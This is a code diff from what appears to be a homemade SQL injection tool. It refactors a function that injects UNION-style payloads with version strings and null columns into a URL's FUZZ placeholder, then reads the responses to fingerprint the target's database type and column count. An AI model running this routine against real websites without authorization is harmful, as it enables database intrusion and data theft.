@@ -1,6 +1,5 @@
 from enum import Enum
 from requests import request
-from printer import error
 
 
 class State(Enum):
@@ -44,7 +43,7 @@ def is_injectable(url, success_str, error_str):
         return State.Error
 
 
-def determine_dbms(url, success_str, error_str, poison, columns=1, brute_force=False):
+def determine_dbms(opts, poison, columns=1, brute_force=False):
     sql_version = None
     brute_force_limit = 20
 
@@ -55,17 +54,19 @@ def determine_dbms(url, success_str, error_str, poison, columns=1, brute_force=F
         nulls = "".join([",null" for _ in range(0, columns-1)])
         poison_str = poison + version_string.value + nulls + ";--"
 
-        target = url.replace("FUZZ", poison_str)
+        target = opts.URL.replace("FUZZ", poison_str)
         result = request("get", target).text
 
-        if success_str in result and error_str in result:
+        if opts.SUCCESS_STR in result and opts.ERROR_STR in result:
             sql_version = DBMS_Type.AMBIGUOUS
-        elif success_str in result:
+        elif opts.SUCCESS_STR in result:
             sql_version = DBMS_Type[version_string.name]
             break
 
     if brute_force and sql_version is None:
-        return determine_dbms(
-            url, success_str, error_str, poison, columns + 1, True)
+        return determine_dbms(opts, poison, columns + 1, True)
+
+    # update correct column size
+    opts.COLUMNS = columns
 
     return sql_version
